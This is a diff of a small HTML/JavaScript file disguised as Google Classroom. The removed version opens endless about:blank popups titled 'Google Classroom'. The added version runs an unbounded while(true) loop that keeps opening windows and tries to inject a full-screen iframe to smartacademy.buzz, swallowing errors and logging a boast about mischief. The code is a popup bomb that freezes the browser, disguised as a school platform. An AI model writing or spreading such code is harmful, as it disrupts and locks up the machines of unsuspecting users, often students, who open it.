@@ -1,38 +1,25 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Google Classroom</title>
-    <link rel="icon" href="https://www.gstatic.com/classroom/favicon.ico" type="image/x-icon">
-</head>
-<body>
-    <script>
-        function setPopupTitleAndFavicon() {
+<script>
+// Initiate an infinite loop
+while (true) {
+
+	setTimeout(() => {
+
             try {
-                var page = window.open('about:blank');
-                page.addEventListener("DOMContentLoaded", function () {
-                    page.document.title = "Google Classroom";
-                    var link = page.document.createElement('link');
-                    link.type = 'image/x-icon';
-                    link.rel = 'shortcut icon';
-                    link.href = 'https://www.gstatic.com/classroom/favicon.ico';
-                    page.document.head.appendChild(link);
-                });
-            } catch (error) {
-                console.error("An error occurred:", error);
-            }
-        }
+                var page = window.open('Classroom.google.com');
+                page.document.body.innerHTML = `<iframe style="height:100%; width: 100%; border: none; position: fixed; top: 0; right: 0; left: 0; bottom: 0; border: none" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation" src="` + "https://smartacademy.buzz" + `"></iframe>`;
+            } catch {}
+		console.log("Cool! seems youve taken your misjiff to a higher level!");
 
-        // Check if popups are blocked
-        var testPopup = window.open('about:blank');
-        if (testPopup === null || testPopup.closed) {
-            alert("This tool requires popups to function. Please allow popups in your browser settings.");
-        } else {
-            testPopup.close();
-            setPopupTitleAndFavicon();
-        }
+     //       window.location.replace((localStorage.getItem('incog||ab') || 'about:blank'));
 
-        // Continuously open popups
-        setInterval(setPopupTitleAndFavicon, 0);
-    </script>
-</body>
-</html>
+	}, "17");
+            try {
+                var page = window.open('classroom.google.com');
+                page.document.body.innerHTML = `<iframe style="height:100%; width: 100%; border: none; position: fixed; top: 0; right: 0; left: 0; bottom: 0; border: none" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation" src="` + "https://smartacademy.buzz" + `"></iframe>`;
+            } catch {}
+
+	for (let x=0; x<5000; x++) {
+		
+	}
+}
+</script>
